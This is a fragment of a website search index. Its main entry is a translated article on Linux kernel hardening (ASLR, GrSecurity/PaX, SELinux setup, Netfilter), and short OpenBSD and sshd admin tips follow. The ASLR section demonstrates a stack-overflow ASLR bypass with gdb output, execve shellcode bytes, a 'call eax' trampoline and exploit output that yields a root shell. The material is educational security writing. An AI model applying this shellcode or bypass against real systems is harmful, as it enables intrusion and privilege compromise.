                content: "Introduction linkThis article offers an overview of various security mechanisms related to the kernels of GNU/Linux operating systems to ensure the integrity protection of your environment. In this first part, you’ll find an introduction to these mechanisms as well as to GNU/Linux system kernels in general.\nPresentation linkThe growing enthusiasm of users for the Linux operating system, particularly from security experts or system administrators, is largely due to the robustness and advanced features this operating system offers. The kernel, the core of the system, manages most of the security-related functions in the environment.\nLinux’s development process and quality are now widely recognized. It relies on a very large community of experts and enthusiasts who contribute to the project’s evolution and continuous improvements. This is indeed a particularly decisive property when choosing equipment for a secure infrastructure.\nSecurity patches for Linux systems are published very quickly, and it’s not uncommon to have them available within 24 hours following the publication of a security vulnerability on a full-disclosure type list (bugtraq, etc.).\nSeveral security-related features are natively integrated into the Linux kernel. These include management of syncookies, which helps address SYN flood attacks, filtering functionality provided by Netfilter, and other less explicit features that strengthen the overall security of the system.\nAn important distinction must be made between network security managed at the operating system level (IP ID randomization, socket restrictions, layer 3 filtering, etc.) and application security that helps prevent or limit the exploitation of higher-level software vulnerabilities. These generally belong to the user land.\nThe Linux kernel used in this article is 2.6.16.9, the latest stable version at the time of writing. Later versions will have the same features and will certainly offer new ones. The various patches presented in the following chapters should be retrieved according to the version used, but the approach remains broadly identical.\nGrSecurity is probably the best-known project of this type, although it is one of the least financially supported. SELinux (Security Enhanced Linux), on the contrary, has significant resources, being developed by the NSA (National Security Agency - American intelligence organization specialized in new technologies).\nThe GrSecurity and SELinux approaches are diametrically opposed: GrSecurity strengthens system security upstream, adding numerous application features that make software vulnerabilities very complex to exploit (buffer overflows in the stack, heap, format bugs, race conditions, etc.).\nSELinux, on the other hand, opts to restrict the environment available to an attacker following system compromise. The attacker is then restricted with low privileges and confined to the bare minimum. This is a MAC (Mandatory Access Control) approach.\nThe different approaches, whether placed upstream or downstream of the compromise, will be presented in this article. They all have multiple advantages and disadvantages, particularly in terms of performance. Using both solutions simultaneously, while theoretically possible, proves too burdensome in practice. In security, everything is a matter of compromise…\nTechnical prerequisites are necessary for a good understanding of this article, particularly those concerning vulnerability exploitation under Linux (buffer/heap overflows mainly). The reader can refer to the abundant literature available on the Internet on this subject.\nAddress Space Layout Randomization linkASLR or Address Space Layout Randomization is a Linux kernel feature that randomizes memory address space areas such as the heap or stack to complicate the work of an attacker wishing to compromise a machine via a buffer overflow attack, for example.\nA major new feature has recently appeared in the Linux kernel, with native support for the equivalent of ASLR (Address Space Layout Randomization). This makes memory address space random for certain areas, such as the heap or stack.\nIndeed, these two memory sections most often contain the buffers of a process. Dynamic allocations (*malloc) are placed in the heap while static ones (char/int/… *buff[SIZE]) are placed in the stack.\nThe famous media-hyped buffer overflows exploit these memory areas to place a shellcode (sequence of OPCODEs) and then redirect the execution flow to the address containing it.\nBy making these addresses random, the attacker can no longer use traditional exploitation techniques, making successful exploitation much rarer.\nA process named “srv” is launched below. An analysis of the memory areas allocated to the sections shows that the stack is contained between addresses 0xBF7F7000 and 0xBF80D000:\n$srv\u0026 [3027] $ cat /proc/3027/maps (...) 0804a000-0806b000 rw-p 0804a000 00:00 0 [heap] b7da3000-b7da4000 rw-p b7da3000 00:00 0 b7da4000-b7ed2000 r-xp 00000000 03:04 345236 /lib/tls/libc-2.3.6.so b7ed2000-b7ed7000 r--p 0012e000 03:04 345236 /lib/tls/libc-2.3.6.so b7ed7000-b7eda000 rw-p 00133000 03:04 345236 /lib/tls/libc-2.3.6.so b7eda000-b7edc000 rw-p b7eda000 00:00 0 b7ef5000-b7ef8000 rw-p b7ef5000 00:00 0 b7ef8000-b7f0d000 r-xp 00000000 03:04 2032253 /lib/ld-2.3.6.so b7f0d000-b7f0f000 rw-p 00015000 03:04 2032253 /lib/ld-2.3.6.so bf7f7000-bf80d000 rw-p bf7f7000 00:00 0 [stack] ffffe000-fffff000 ---p 00000000 00:00 0 [vdso]Texte When launching the same process a second time, we notice that the stack address has indeed changed and is now between 0xBF865000 and BxBF87B000:\n$srv\u0026 [3593] $ cat /proc/3593/maps (...) 0804a000-0806b000 rw-p 0804a000 00:00 0 [heap] b7e11000-b7e12000 rw-p b7e11000 00:00 0 b7e12000-b7f40000 r-xp 00000000 03:04 345236 /lib/tls/libc-2.3.6.so b7f40000-b7f45000 r--p 0012e000 03:04 345236 /lib/tls/libc-2.3.6.so b7f45000-b7f48000 rw-p 00133000 03:04 345236 /lib/tls/libc-2.3.6.so b7f48000-b7f4a000 rw-p b7f48000 00:00 0 b7f63000-b7f66000 rw-p b7f63000 00:00 0 b7f66000-b7f7b000 r-xp 00000000 03:04 2032253 /lib/ld-2.3.6.so b7f7b000-b7f7d000 rw-p 00015000 03:04 2032253 /lib/ld-2.3.6.so bf865000-bf87b000 rw-p bf865000 00:00 0 [stack] ffffe000-fffff000 ---p 00000000 00:00 0 [vdso]Texte Let’s now analyze the more concrete case of a software vulnerability in the example below. It contains the here_is_the_bug function that performs an unbounded buffer copy into “buffer” with a fixed size of 150 bytes (which is placed in the stack):\n(gdb) list here_is_the_bug 20 char * Connection; 21 } browser; 22 23 24 void here_is_the_bug(pbrowser Browser) 25 { 26 27 char buffer[150]; 28 if(Browser-\u003eUserAgent != NULL) 29 { 30 strcpy(buffer,Browser-\u003eUserAgent); 31 } 32 } Using the gdb debugger, let’s place two breakpoints (software stop points), before and after rewriting the return address (saved eip) placed in the stack. The buffer is placed here at address 0xBFC73960. After rewriting the buffer, we pass the second breakpoint. The program “normally” crashes (the address used for the rewrite being false and no longer points in the stack):\n(gdb) b 31 Breakpoint 1 at 0x804859e: file srv.c, line 31. (gdb) run \u003c paquet_mal Breakpoint 1, here_is_the_bug (Browser=bfff0xf3a7) at srv.c:32 32 } (gdb) print \u0026buffer $1 = (char (*)[150]) 0xbfc73960 (gdb) c Continuing. Program received signal SIGSEGV, Segmentation fault. 0xbffff3a7 in ?? () When restarting the same executable, at the first breakpoint, we notice the address change: the buffer concerned is now at 0xBF999AE0:\n(gdb) run \u003c paquet_mal Breakpoint 1, here_is_the_bug (Browser=bfff0xf3a7) at srv.c:32 32 } (gdb) print \u0026buffer $2 = (char (*)[150]) 0xbf999ae0 It is therefore no longer possible to use so-called classic techniques to redirect the execution flow. At best with this technique, the attacker will cause a DoS (Denial Of Service).\nDespite the higher security level that this solution provides, we found while studying it that this protection could be bypassed using indirect means…\nAt the second breakpoint, placed before returning from the function and after rewriting the return address (the saved eip displayed by gdb, 0xBFFFf3A7 is none other than the one we rewrote), we analyze the register values:\n(gdb) info frame Stack level 0, frame at 0xbf999b90: eip = 0x804859e in here_is_the_bug (srv.c:32); saved eip 0xbffff3a7 called by frame at 0xbf999b94 source language c. Arglist at 0xbf999b88, args: Browser=0xbffff3a7 Locals at 0xbf999b88, Previous frame's sp is 0xbf999b90 Saved registers: ebp at 0xbf999b88, eip at 0xbf999b8c (gdb) info registers eax 0xbf999ae0 -1080452384 ecx 0xbf999bbd -1080452163 The value contained in the EAX register is… the address of our buffer! This property is due to the use of the strcpy function. Indeed, if we place ourselves at a lower level (assembly code), the different addresses and values used are placed in the appropriate registers, then a jump to the code of the strcpy function is subsequently performed. Since this function cannot do without the destination address of the buffer, it is logical that it should be placed in an accessible register (here EAX).\nLet’s verify the hypothesis that the EAX address indeed contains our instruction sequence previously placed in memory (sequence of NOP then shellcode):\n(gdb) x/5bi 0xbf999ae0 0xbf999ae0: nop 0xbf999ae1: nop 0xbf999ae2: nop 0xbf999ae3: nop 0xbf999ae4: nop (gdb) x/100bx 0xbf999ae0 0xbf999ae0: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xbf999ae8: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xbf999af0: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xbf999af8: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xbf999b00: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xbf999b08: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0xbf999b10: 0x90 0x90 0x90 0x90 0x90 0x31 0xc0 0x31 0xbf999b18: 0xdb 0x31 0xc9 0xb0 0x46 0xcd 0x80 0x31 0xbf999b20: 0xc0 0x50 0x68 0x2f 0x2f 0x73 0x68 0x68 0xbf999b28: 0x2f 0x62 0x69 0x6e 0x89 0xe3 0x8d 0x54 0xbf999b30: 0x24 0x08 0x50 0x53 0x8d 0x0c 0x24 0xb0 0xbf999b38: 0x0b 0xcd 0x80 0x31 0xc0 0xb0 0x01 0xcd 0xbf999b40: 0x80 0xbf 0xa7 0xf3 The 0x90 bytes are the NOPs, mostly used to reduce the heuristic necessary for exploiting a buffer overflow (we could have done without them in this case of exploitation). Incidentally, note the 0xCD80 OPCODEs (in bold above) which represent the call to the execution interrupt to give us a shell on the remote machine (int $0x80).\nThe exploitation principle is then very clear: we must make the machine execute the equivalent of a jmp %eax or call %eax that will jump directly to our shellcode.\nBy performing a search in the process memory, thanks to the opcode finder that we developed for the occasion, we find an address (in a fixed addressing area this time) containing the OPCODEs of the “call EAX” instruction:\n# ./memory_dumper 080484b0 0804A4b0 10497 output Found at 0x8048c03 Since the EAX register points to our buffer (which contains a valid shellcode), the bypass is then performed:\n# ./exploit localhost 8000 0 Using align value 0 Trying \"call eax\" compliant address: 0x08048c03 Linux lapt41p 2.6.16 #3 PREEMPT i686 GNU/Linux uid=0(root) gid=0(root) groups=0(root) # More technical information about ASLR is available at the following addresses:\nLwn.net\nSearchopensource.techtarget.com\nMetasploit msg 00735\nMetasploit msg 00736\nOther protections, located in userland via the libc library, allow among other things to protect against exploitations in the heap via the unlink method. They are complementary to an ASLR usage and will not be described in this article.\nGrSecurity and PaX linkGrSecurity strengthens the security of userland processes, making it possible to make vulnerability exploitation more complex for an attacker on an operating system. GrSecurity relies on PaX for protections related to kernel and user land memory processing.\nGrSecurity offers an “upstream” approach to kernel security enhancements. By this means, the security of processes in userland can also be strengthened. The kernel does indeed play a major role in process management. It defines the use of memory ranges (stack, heap, base address of binary loading, etc.) and execution, read or write zones.\nBy combining several techniques, it is possible to make particularly complex the exploitation of vulnerabilities present on the system. At best (except for bypassing protections), an attacker will cause a denial of service on the vulnerable process (which can still be critical depending on how it is used), or more seriously, on the kernel.\nGrSecurity comes as a kernel patch. It is updated very regularly and is available at the following address.\nMany features are integrated into GrSecurity, the most known being PaX which allows adding several protections related to kernel and user land memory processing.\nHere is the list of the main GrSecurity features (more technical details are available on the project’s official website):\nRole-Based Access Control (RBAC), which allows segmentation of GrSecurity restrictions based on many criteria: user, process, file… Control over level 3 network functionalities Possibilities of capabilities that can be attributed to non-root users, without prior authentication. Scripting support in the configuration (management of variables, logical operators, etc.) Object management with possible inheritances for ACL definitions. Dynamic creation and deletion of objects. Real-time resolution of regular expressions (possible temporal processing) Protection of the ptrace system call (dynamic debugging that can be used to circumvent certain protections) according to the user and/or the process. /dev/grsec devfs entry allowing kernel land / user land interfacing. “Next-generation” code that produces least privilege policies for the entire system without the need for prior configuration. Static policies configurable with the gradm tool. Possibility of dynamic creation of policies with a learning mode that considerably reduces the work of the system administrator and quickly debugs classic problems caused by the use of ACL. Protection on the environment, filenames, etc. /proc//ipaddr allows listing the remote IP address of the user who initiated a connection or launched a network process. Support of read/write/execution of ptrace calls Support for PaX flags to protect only certain binaries, or relax the policy on others (particularly useful for an X server for example). Protection on shared memory functions. Monitoring of certain processor-specific flags (especially in the context of the fight against offensive codes): trojans, spywares… Audit functions that can be applied to certain users only (restricted GID) Support for restrictions on resources, sockets and capabilities. Protection against bruteforces of exploit addresses. Protection on procfs /proc/[PID] files (memory, mappings, etc.). Possible policy regeneration. Configurable log suppression. Possible configuration of processes related to account management (creation, deletion, modification…). Intuitive and quick configuration. Independence of file system and architecture. Minimal impact on overall system performance. Support for multi-processors (SMP). Most operations are performed in O(1) complexity. Dynamic activation/deactivation and reloading of capabilities via procfs. Option to hide user processes from other “normal” system users. procfs (/proc) restrictions on the dissemination of information to “normal users”, including on processes belonging to them. Restrictions on symbolic and physical links (on inodes) to counter race condition attacks. Restrictions on the stack (execution, manipulation, etc.). Impossibility for “normal” users to access dmesg information, information often returned by the kernel or by modules. Improvement of the implementation of Trusted Path Execution (TPE) Socket restrictions by GID (Group ID). Great flexibility of configuration thanks to support by syscontrol (sysctrl). Locking mechanism of sysctl after configuration (lock). Security alerts raised with the attacker’s network information (IP, possible DNS resolution…) Automatic stopping of processes restarted several times in a reduced time lapse (exploit bruteforces). Automatic modes in the configuration: low, medium and high Configurable restrictions on flood attacks and/or resource depletion. Improvement of randomness generators. Random PIDs (Process ID). Random TCP source ports Logs of executions (executables and arguments). Logs on unauthorized resource access attempts. Logs of calls to the chdir system call. Logs of mount and unmount calls. Logs of signals (SIGHUP, SIGKILL…). Logs of errors on fork calls. Logs of time changes. PaX: Implementation of user access to non-executable memory pages (protections on ret-into-libc exploitations) with negligible performance loss on Intel processors. PaX: Implementation of user access to non-executable memory segments (protections on ret-into-libc exploitations) with negligible performance loss on Intel processors. PaX: Random addresses of stack and base address of loaded files (mmap) on many architectures (i386, sparc, sparc64, alpha, parisc, amd64, ia64, ppc, and mips). PaX: Random heap addresses on i386, sparc, sparc64, alpha, parisc, amd64, ia64, ppc, and mips architectures. PaX: Random base address of executables for i386, sparc, sparc64, alpha, parisc, amd64, ia64, and ppc architectures. PaX: Random kernel stack. PaX: Automatic emulation by bounces (indirect addressing) on the libc: anti ret-into-libc protection (libc5, glibc 2.0, uClibc, Modula-3…). PaX: Emulation of the PLT (Procedure Linkage Table) allowing the loading into memory of function addresses at random addresses. Dynamic kernel modifications impossible via the pseudo files /dev/mem, /dev/kmem, or /dev/port. Options to prohibit direct access to writes on inputs/outputs (raw IO). No attachment to shared memory by chrooted processes. No call to kill inside a chroot. No call to ptrace inside a chroot. No call to setpgid inside a chroot. No call to getpgid inside a chroot. No call to getuid inside and outside a chroot. Impossibility to send signals to processes located outside the current chroot. Impossibility to list processes outside a chroot. Impossibility to mount/unmount partitions inside a chroot. No call to the “pivot” function inside a chroot (known escape method). Impossibility to do double chroots (known escape method). No fchdir outside a chroot Reinforcement of the call to chdir(\"/\") in a chroot Impossibility to suid (chmod +s) binaries inside a chroot. Impossibility to create special files using mknod inside a chroot. No sysctl writing inside a chroot. Impossibility to change scheduler priorities inside a chroot (nice). Impossibility to connect to abstract UNIX sockets located outside a chroot. Logs of executions inside a chroot. The gradm tool (available on the grsecurity website) and paxctl (available on the PaX website) allow for lightening or increasing GrSecurity/PaX restrictions on binaries, and this on a per-unit basis. It is then possible to exclude binaries from the protections in effect on the system, for example.\nThe installation is very simple and quick. Just download the latest patch from the GrSecurity website and install it:\ngunzip grsecurity-2.1.8-2.6.14.6-200601211647.patch.gz cp grsecurity-2.1.8-2.6.14.6-200601211647.patch linux cd linux patch -p1 \u003c grsecurity-2.1.8-2.6.14.6-200601211647.patch patching file security/security.c (...) Configuration is then done in the classic way with a make menuconfig for example.\nGrSecurity and Pax are placed in the “Security options” menu, just like SELinux, alongside other low-level protection means:\nLinux Kernel v2.6.16.9 Configuration Linux Kernel Configuration x x Code maturity level options ---\u003e x x General setup ---\u003e x x Loadable module support ---\u003e x x Block layer ---\u003e x x Processor type and features ---\u003e x x Power management options (ACPI, APM) ---\u003e x x Bus options (PCI, PCMCIA, EISA, MCA, ISA) ---\u003e x x Executable file formats ---\u003e x x Networking ---\u003e x x Device Drivers ---\u003e x x File systems ---\u003e x x Instrumentation Support ---\u003e x x Kernel hacking ---\u003e x x Security options ---\u003e x x Cryptographic options ---\u003e x x Library routines ---\u003e x x --- x x Load an Alternate Configuration File x x Save Configuration to an Alternate File In the “Security options” menu, PaX and GrSecurity are dissociated. However GrSecurity also offers functionality related to memory management:\nPaX ---\u003e Grsecurity ---\u003e [*] Enable access key retention support [*] Enable the /proc/keys file by which all keys may be viewed [*] Enable different security models [*] Socket and Networking Security Hooks \u003c*\u003e Default Linux Capabilities \u003c \u003e Root Plug Support \u003c*\u003e BSD Secure Levels For Pax, the sub-menus allow fine-tuning of memory protection:\n[*] Enable various PaX features PaX Control ---\u003e Non-executable pages ---\u003e Address Space Layout Randomization ---\u003e GrSecurity configuration is done on the same model:\n[*] Grsecurity Security Level (Custom) ---\u003e Address Space Protection ---\u003e Role Based Access Control Options ---\u003e Filesystem Protections ---\u003e Kernel Auditing ---\u003e Executable Protections ---\u003e Network Protections ---\u003e Sysctl support ---\u003e Logging Options ---\u003e Detailing all the GrSecurity options would be far too long (even the official documentation quickly covers these features). For each feature offered, detailed help in English allows you to understand the precise roles. To access it, you will need to place yourself on the function for which you want to get help, then press the “?” key.\nHowever, be careful with the “Runtime module disabling” option, usually discouraged, unless you want to prohibit or drastically restrict the use of modules (LKM: Linux Kernel Module).\nThe “sysctl enable” function is also discouraged as it allows for easily “bypassing” GrSecurity if the sysctl lock is not properly placed. So don’t enable it if you don’t know exactly what it does.\nThe “W^X” approach (to be read as “Write XOR eXecute”) prevents a memory section from being activated for writing and execution simultaneously. As a result, a shellcode placed by a user cannot be executed there. However, there are still ways to bypass this latter technique… As always!\nSELinux linkPart 1 linkSELinux brings to the kernels of GNU/Linux operating systems its numerous and rich functionalities, notably to restrict the environment in which an attacker could benefit from a successful exploitation. This first part concerns the presentation of these functionalities and the installation of SELinux.\nFollowing long and virulent debates between Linux kernel maintainers, but also between end users, SELinux was finally adopted as the default security solution when moving to kernel versions 2.6.X. The previous stable branch of the kernel (2.4.X) did not offer, by default, any solution of this type; this need had been strongly expressed for several years already.\nThe choice of SELinux was motivated in particular by the guarantees that this project could bring in terms of maintenance, scalability, but also means. The American NSA services were able (history will probably never tell if complete transparency was in place or not), it seems, to stand out with Linus Torvald to have their solution adopted.\nIn any case, the quality of SELinux code and the richness of its functionality make it a highly “recommendable” solution for reinforcements on production servers requiring ever more robustness, security, and accessibility.\nThe SELinux reinforcement approach is therefore based, as we introduced, on the means to restrict as much as possible the environment of an attacker who has partially (user rights) or totally (root rights) compromised the information system. The root user (often called “superuser” because of his unlimited rights on a standard Linux system) is then himself restricted.\nAs a result, compromising a server implementing SELinux can then be reduced to only local damage of the incriminated vulnerable application (this is not always true by the way!).\nThe “classic” type of access control management is of the DAC (Discretionary Access Control) type. The one chosen by SELinux is very close to MAC (Mandatory Access Control) with some adaptations, however.\nIt bears the name of Flask and differs from MLS (Multi-Level Security) type MAC which do not integrate:\ncontrol over data integrity; the principle of “least privilege”; the separation of processes and objects in the ACL (Access Control List) sense of the term. MLSes are content to ensure the confidentiality of files and certain data according to the users or calls that initiate it.\nFlask therefore makes it possible to overcome these different problems by offering adapted counter-measures and by adding protections on:\nFiles Processes Signals, and ptrace-type calls Sockets and network flows The management of kernel land interfacing via a control on modules, system calls and other biases allowing to reach the system kernel. But also on the internal workings of programs thanks to an API allowing to use the SELinux functionalities directly. At the level of options to configure in the kernel, SELinux has multiple dependencies that will have to be “resolved” before adding support. Depending on the file system used, remember the necessary entries in the “File systems” section of your configuration.\nA simple make menuconfig will allow you to define the options you want to use.\nHere are the options necessary for its proper functioning:\n\"Code maturity level options\" [*] Prompt for development and/or incomplete code/drivers \"General setup\" [*] Auditing support \"File systems\" \u003c*\u003e Second extended fs support [*] Ext2 extended attributes [ ] Ext2 POSIX Access Control Lists [*] Ext2 Security Labels \u003c*\u003e Ext3 journalling file system support [*] Ext3 extended attributes [ ] Ext3 POSIX Access Control Lists [*] Ext3 security labels \u003c*\u003e JFS filesystem support [ ] JFS POSIX Access Control Lists [*] JFS Security Labels [ ] JFS debugging [ ] JFS statistics \u003c*\u003e XFS filesystem support [ ] Realtime support (EXPERIMENTAL) [ ] Quota support [ ] ACL support [*] Security Labels [*] /proc file system support [ ] /dev file system support (EXPERIMENTAL) [*] /dev/pts file system for Unix98 PTYs [*] /dev/pts Extended Attributes [*] /dev/pts Security Labels [*] Virtual memory file system support [*] tmpfs Extended Attributes [*] tmpfs Security Labels \"Security options\" [*] Enable different security models [*] Socket and Networking Security Hooks \u003c*\u003e Capabilities Support [*] NSA SELinux Support [*] NSA SELinux boot parameter [*] NSA SELinux runtime disable [*] NSA SELinux Development Support [*] NSA SELinux AVC Statistics [*] NSA SELinux MLS policy (EXPERIMENTAL) Warning: remember to keep only the bare minimum, especially if it’s a production server. So it’s unnecessary to compile support for a Tuner card, 3D hardware acceleration, etc.\nOnce the kernel is fully configured (this phase is often much longer than the compilation phase that follows), the classic steps follow:\nmake make modules make modules_install cp arch/i386/bzImage /boot/vmlinux-2.6.16 cp System.map /boot/System.map-2.6.16 cp .config /boot/config-2.6.16 Then if you use grub (here with an ide disk), add in the /boot/grub/menu.lst file the following lines with the disk and partition information concerning your machine:\ntitle Linux-2.6.16 root (hd0,3) # To be adapted according to your configuration kernel /boot/vmlinuz-2.6.16 root=/dev/hda4 # Adapt root according to your configuration Or lilo (/etc/lilo.conf):\nimage=/boot/vmlinuz-2.6.16 label=linux read-only root=/dev/hda4 The /selinux directory must then be created to store future policy files (SELinux MAC rules):\nmkdir /selinux chmod 700 /selinux The /etc/fstab file, containing the virtual and physical mount points of the machine, must be completed to include the latest mount relative to SELinux:\nnone /selinux selinuxfs defaults 0 0 The kernel and system are configured to use SELinux. A simple restart, selecting the new generated kernel is necessary to continue the deployment.\nPart 2 linkFind, in this second part devoted to SELinux, the details relating to the configuration of SELinux security rules as well as the presentation of different tools and pre-established rules with the aim of facilitating the security of a system in a maximal way.\nLike all systems based on ACL (Access Control List), the configuration of rules is undoubtedly the most delicate phase because the omission of a single rule often means malfunction or simply crash (impossible access to a file, filtered network flow, etc.).\nWe will not detail the configuration of SELinux rules “point by point”, given the multitude of different uses a server can have. On the other hand, we will present the method for defining, then refining the rules in order to obtain the most restrictive but still functional system possible (which is the purpose of this protection, let us remember)…\nIt is rather unthinkable (or then with a consequent budget!) to redefine the rules for each system process. Several approaches are then possible: use tools allowing to “learn” the behavior of the system (accessed files and resources, etc.) and draw a first basic configuration from it. The second, finer approach is to use the rules proposed by the distribution. Most distributions offer this type of rules.\nLet’s now focus on the Debian distribution approach, with its selinux-policy-default package. During installation, apt-get asks many questions about the server’s intended use. The most common uses (graphical server, mail server, apache server, etc.) are then proposed, and you simply need to answer the questions asked to generate the appropriate rules:\n(...) Do you want domains/program/ircd.te:Ircd - IRC server Yes/No/Display [Y/n/d]? Do you want domains/program/distcc.te:distcc - Distributed compiler daemon Yes/No/Display [Y/n/d]? Do you want domains/program/gnome-pty-helper.te:Gnome Terminal - Helper program for GNOME x-terms Yes/No/Display [Y/n/d]? Do you want domains/program/uwimapd.te:uw-imapd-ssl server Yes/No/Display [Y/n/d]? Do you want domains/program/apache.te:Apache - Web server Yes/No/Display [Y/n/d]? Do you want domains/program/klogd.te:Klogd - Kernel log daemon Yes/No/Display [Y/n/d]? (...) Once all these default rules are defined, it’s advisable to refine the protection by re-checking them and adapting them to the exact use that will be made of them. They are contained in /etc/selinux then transferred in their binary versions in the /selinux directory.\ncd /etc/selinux/(strict|targeted)/src/policy make relabel Many resources on the configuration of tools, servers are available. Other policies are also available elsewhere.\nThe most critical patches regarding system security are those of init (sysvinit-selinux.patch under Debian), pam (pam-selinux.patch under Debian), sshd (openssh-selinux.patch under Debian) and crond (vixie-cron-selinux.patch under Debian).\nThese patches load the policy and initialize the user’s security contexts. It is also necessary to modify the pam configuration for login (file /etc/pam.d/login):\nsession required pam_selinux.so multiple The checkpolicy tool allows compiling policy sources to translate them into “binaries” recognized by SELinux. It is therefore necessary to run this tool on the created policies before importing them.\nThe refpolicy tool, on the other hand, allows creating complete SELinux policies as alternatives to the strict policies available on classic distributions. It is a tool still in the development phase, supported by the “Tresys Technology” team. Many contributors publish the policies they have created, thus making available to the public a wide choice of files. The “getting started” page of the following site also allows to become familiar with the writing of these files.\nNote that at the policy level, the following “roles” are intended for users who need additional capabilities on the system:\nstaff_r sysadm_r system_r While the user_r role is intended for normal users, requiring no special privileges.\nIt is recommended, depending on the chosen Linux distribution, to install the SELinux-related packages. If you’re using the Debian distribution for example, the following packages are more than recommended for optimal operation:\ncheckpolicy - SELinux policy compiler libselinux1 - SELinux shared libraries libselinux1-dev - SELinux development headers libsemanage1 - shared libraries used by SELinux policy manipulation tools libsemanage1-dev - Header files and libraries for SELinux policy manipulation tools libsepol1 - Security Enhanced Linux policy library for changing policy binaries polgen - SELinux policy generation scripts policycoreutils - SELinux core policy utilities python2.4-selinux - Python2.4 bindings to SELinux shared libraries python2.4-semanage - Python2.4 bindings for SELinux policy manipulation tools selinux-basics - SELinux basic support selinux-doc - documentation for Security-Enhanced Linux selinux-policy-default - Policy config files and management for NSA Security Enhanced Linux selinux-utils - SELinux utility programs slat - Tools for information flow analysis of SELinux policies polgen-doc - Documentation for SELinux policy generation scripts These packages will take care of the userland part of SELinux, namely the installation of certain patches (especially on the libc to make certain SELinux-specific hooks supportable), the adaptation of sensitive system files (/etc/passwd, /etc/shadow), to prevent the root superuser from modifying them.\nThe binaries id and ls (ps -eZ) then allow displaying the security contexts and extended attributes on the file system.\nAt the very end of the configuration, after multiple tests, the enforcing=1 option must be added to the boot loader options at startup (lilo or grub) to make SELinux effective from the moment of loading.\nNetfilter, conclusions \u0026 webography linkThe power of configuring filtering rules with Netfilter on GNU/Linux operating systems is well established, but few ultimately know all the functionalities available with this tool. Also find the conclusions of this file on strengthening the security of Linux kernels as well as all the addresses of cited websites.\nThe functionalities linked to filtering security, whether at level 2 (MAC/Bridge filtering, ebtables, etc.), or at level 3 (Netfilter and its userland “caller” iptables) are integrated into the kernel. The power of possible modifications is enormous, and it is possible, given time and expertise, to transform a Linux server into a robust network equipment capable of supporting very heavy loads.\nNetfilter allows, by default, to perform numerous treatments on packets that transit (INPUT, OUTPUT, and FORWARD chains) but also modifications (mangle table).\nNew functions are available thanks to the patch-o-matic package which allows adding several advanced functions (processing by UID/GID, pattern-matching, rules reacting to time constraints, etc.).\nWe will not go into the details specific to such configurations, which could, on their own, be the subject of numerous articles. The reader can refer to the many resources available on the Internet.\nAlso note the default integration of IPSEC in 2.6.x kernels which allows setting up secure networks, on IP, at lower cost, without necessarily deploying the IPv6 arsenal.\nThe protections at the Linux kernel level, as we have seen, allow significantly strengthening the overall security of the system. They will reduce to nothing massive exploitations of the script kiddies type or worms. A very experienced attacker, during a targeted attack, could however possibly find a way to circumvent certain protections (cf. chapter on bypassing ASLR).\nZero risk in security, we know well, does not exist and the means of protection are often mistreated by researchers and then rendered obsolete after only a few years.\nA Linux server placed in an area considered unsafe (Internet is obviously part of it) should systematically integrate one of these kernel reinforcements. It is possible, by combining these protections, with a correctly defined security policy (password policy, updates, etc.) to reach a very advanced limit.\nThe last factor, and not the least important, then becomes “human”: social engineering, information leaks, and of course physical protection means… But before reaching this level of security, there remains a great deal of work to be done on the means of logical protection!\nNote that some specialized distributions are oriented towards these “high security levels”. One of the best known some time ago was Adamantix, on a Debian base, which is no longer maintained at the present time… Advice to amateurs!\nResources linkSecuObs Article\n"
            }
        );
    index.add(
            {
                id:  712 ,
                href: "\/Trunking_:_Cr%C3%A9er_du_trunking_%28bonding%29_sur_OpenBSD\/",
                title: "Trunking: Creating Trunking (bonding) on OpenBSD",
                description: "This guide explains how to configure network interface trunking (bonding) on OpenBSD systems to combine multiple physical interfaces into a single virtual interface.",
                content: "Introduction linkThe following is used on OpenBSD since version 3.9 to combine two physical interfaces (fxp1, fxp2) into a single virtual interface (trunk0). This method allows one to take the feeds from a traditional two-output tap and present a single virtual interface to NSM applications.\nConfiguration linkModify the interface and put yours:\nifconfig fxp1 up ifconfig fxp2 up ifconfig trunk0 trunkport fxp1 up ifconfig trunk0 trunkport fxp2 up ifconfig trunk0 trunkproto roundrobin up Modes linkIf you don’t need roundrobin, choose the mode that you would like:\nroundrobin: Distributes outgoing traffic using a round-robin scheduler through all active ports and accepts incoming traffic from any active port. failover: Sends and receives traffic only through the master port. If the master port becomes unavailable, the next active port is used. The first interface added is the master port; any interfaces added after that are used as failover devices. loadbalance: Balances outgoing traffic across the active ports based on hashed protocol header information and accepts incoming traffic from any active port. The hash includes the Ethernet source and destination address, and, if available, the VLAN tag, and the IP source and destination address. broadcast: Sends frames to all ports of the trunk and receives frames on any port of the trunk. none: This protocol is intended to do nothing: it disables any traffic without disabling the trunk interface itself. To make this configuration permanent between reboots:\necho \"up\" \u003e /etc/hostname.fxp1 echo \"up\" \u003e /etc/hostname.fxp2 echo \"trunkproto roundrobin trunkport fxp1 trunkport fxp2 172.16.1.100 netmask 255.255.255.0\" \u003e /etc/hostname.trunk0 Remember to replace fxp1 and fxp2 with the network interfaces on your OpenBSD system (e.g., em0, xl0, rl0, etc.). Don’t forget to add your good IP address.\nOpenBSD 3.8 only supported the round robin trunk protocol.\nReferences linkOpenBSD trunk man\n"
            }
        );
    index.add(
            {
                id:  713 ,
                href: "\/Red%C3%A9marrer_certains_services_difficiles\/",
                title: "Restarting difficult services",
                description: "How to restart difficult services like SSH when there's no simple solution to stop them.",
                content: "As you’ve probably noticed, there are some services like SSH that don’t have a simple solution to stop the service.\nThat’s why I’m giving you this solution. For example with SSH, if I want to restart it:\nkill -HUP `cat /var/run/sshd.pid` It’s as simple as that. Now you can manually restart it:\n/usr/sbin/sshd "
            }
        );
    index.add(
            {
                id:  714 ,
                href: "\/Modifier_son_kernel_g%C3%A9n%C3%A9rique\/",
                title: "Modifying Your Generic Kernel",
                description: "How to modify and switch between kernel types in BSD, including changing from single core to multi-core and booting with alternate kernels.",
